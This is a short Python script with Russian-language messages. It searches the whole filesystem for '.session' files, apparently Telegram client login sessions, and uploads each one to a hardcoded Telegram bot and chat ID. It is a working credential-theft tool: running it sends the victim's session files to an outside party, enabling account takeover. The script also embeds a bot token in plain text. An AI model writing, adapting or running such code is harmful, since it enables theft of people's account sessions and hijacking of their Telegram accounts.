import os
import requests
from pathlib import Path

TELEGRAM_BOT_TOKEN = '7921723856:AAGuefrWyoqnpY5riZd-dKhfOn2IOICXxdc'
CHAT_ID = '52133050'

def find_files(extension, search_path):
    result = []
    search_path = Path(search_path)
    for file_path in search_path.rglob(f'*{extension}'):
        result.append(file_path)
    return result

def send_file_to_telegram(file_path):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, files=files, data=data)
        if response.ok:
            print(f'Файл {file_path} успешно отправлен в Telegram.')
        else:
            print(f'Ошибка при отправке файла {file_path}: {response.text}')

search_path = Path('/') if os.name != 'nt' else Path('C:/')
extension = '.session'
found_files = find_files(extension, search_path)

if found_files:
    for file_path in found_files:
        send_file_to_telegram(file_path)
else:
    print("Файлы не найдены.")
